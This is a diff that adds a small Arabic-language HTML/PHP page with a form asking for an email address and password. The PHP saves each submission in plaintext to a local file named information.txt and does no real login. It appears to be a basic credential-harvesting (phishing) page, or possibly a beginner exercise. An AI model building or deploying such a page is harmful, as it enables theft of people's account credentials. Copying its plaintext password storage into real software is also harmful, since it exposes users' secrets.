@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <title>email</title>
+        
+    </head>
+    <body dir="rtl">
+        <form  method="post">
+            <center>
+                <label for="email">الإيميل: </label>
+                <input type="email" name="email" id="email"/>
+                <br>
+                <label for="pass">كلمة مرور : </label>
+                <input type="password" name="pass" id=pass/>
+                <br />
+                <button type="submit" name="send">تأكيد</button>
+            </center>
+        </form>
+        <?php
+            if(isset($_POST['send'])){
+                file_put_contents('information.txt',"الإيميل   ".$_POST['email'].
+                "\nكلمة المرور   ".$_POST['pass']);
+            }
+        ?>
+    </body>
+</html>
